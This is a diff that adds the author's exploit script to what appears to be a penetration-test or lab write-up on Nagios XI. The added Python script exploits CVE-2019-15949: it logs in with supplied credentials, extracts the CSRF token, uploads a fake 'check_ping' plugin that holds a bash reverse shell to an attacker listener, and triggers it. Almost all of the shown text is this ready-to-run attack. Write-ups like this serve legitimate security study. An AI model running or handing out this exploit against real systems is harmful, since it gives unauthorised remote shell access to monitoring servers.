@@ -53,3 +53,120 @@ This assessment reinforced the importance of thorough reconnaissance, especially
 
 **Source:** 
 Nagios Xi 5.6.6 - Authenticated Remote Code Execution (RCE): https://www.exploit-db.com/exploits/52138
+
+**Script I used:**
+```bash
+import argparse
+import re
+import requests
+
+class Nagiosxi():
+    def __init__(self, target, parameter, username, password, lhost, lport):
+        # Initialize parameters for the target, credentials, and listener
+        self.url = target
+        self.parameter = parameter
+        self.username = username
+        self.password = password
+        self.lhost = lhost
+        self.lport = lport
+        self.login()  # Begin with login to obtain authenticated session
+
+    def upload(self, session):
+        # Disable SSL warnings (for self-signed certs or insecure connections)
+        requests.packages.urllib3.disable_warnings()
+
+        print("Uploading malicious plugin to Nagios XI...")
+
+        # Construct upload URL for plugin page
+        upload_url = self.url + self.parameter + "/admin/monitoringplugins.php"
+
+        # First, get the NSP token required for uploading a file
+        upload_token = session.get(upload_url, verify=False)
+        nsp = re.findall('var nsp_str = "(.*)";', upload_token.text)
+        print("Upload NSP Token: " + nsp[0])
+
+        # Prepare reverse shell payload to be uploaded as a fake plugin
+        payload = f"bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"
+
+        # Required form data including the token
+        file_data = {
+            "upload": "1",
+            "nsp": nsp[0],
+            "MAX_FILE_SIZE": "20000000"
+        }
+
+        # Fake plugin upload as a binary file (shell command)
+        file_upload = {
+            "uploadedfile": ("check_ping", payload, "application/octet-stream", {"Content-Disposition": "form-data"})
+        }
+
+        # Upload the fake plugin file to the server
+        session.post(upload_url, data=file_data, files=file_upload, verify=False)
+
+        # Access the malicious payload to trigger code execution
+        payload_url = self.url + self.parameter + "/includes/components/profile/profile.php?cmd=download"
+        session.get(payload_url, verify=False)
+
+    def login(self):
+        # Disable SSL warnings again
+        requests.packages.urllib3.disable_warnings()
+
+        print("Attempting login to Nagios XI...")
+
+        # Start a new session for authentication
+        session = requests.Session()
+
+        # Construct the login URL
+        login_url = self.url + self.parameter + "/login.php"
+
+        # Retrieve the login page to extract NSP token for CSRF protection
+        token = session.get(login_url, verify=False)
+        nsp = re.findall('name="nsp" value="(.*)">', token.text)
+        print("Login NSP Token: " + nsp[0])
+
+        # Create the login POST data with username, password, and token
+        post_data = {
+            "nsp": nsp[0],
+            "page": "auth",
+            "debug": "",
+            "pageopt": "login",
+            "redirect": "",
+            "username": self.username,
+            "password": self.password,
+            "loginButton": ""
+        }
+
+        # Send the login request
+        login = session.post(login_url, data=post_data, verify=False)
+
+        # Check for successful login by keyword in HTML response
+        if "Home Dashboard" in login.text:
+            print("Logged in successfully!")
+        else:
+            print("Login failed. Please check credentials.")
+            return
+
+        # If login succeeded, proceed to upload the malicious plugin
+        self.upload(session)
+
+if __name__ == "__main__":
+    # Set up argument parsing for command line inputs
+    parser = argparse.ArgumentParser(description='CVE-2019–15949 Nagios XI Authenticated Remote Code Execution Exploit')
+
+    # Target URL and required parameters
+    parser.add_argument('-t', metavar='<Target base URL>', help='Example: -t http://nagios.url/', required=True)
+    parser.add_argument('-b', metavar='<Base Directory>', help='Example: -b /nagiosxi/', required=True)
+    parser.add_argument('-u', metavar='<Username>', help='Username for Nagios XI login', required=True)
+    parser.add_argument('-p', metavar='<Password>', help='Password for Nagios XI login', required=True)
+    parser.add_argument('-lh', metavar='<Listener IP>', help='Attacker IP to receive shell', required=True)
+    parser.add_argument('-lp', metavar='<Listener Port>', help='Attacker Port to receive shell', required=True)
+
+    args = parser.parse_args()
+
+    try:
+        print('Launching CVE-2019-15949 Nagios XI exploit...')
+        Nagiosxi(args.t, args.b, args.u, args.p, args.lh, args.lp)
+    except KeyboardInterrupt:
+        print("\nInterrupted by user. Exiting.")
+        exit()
+```
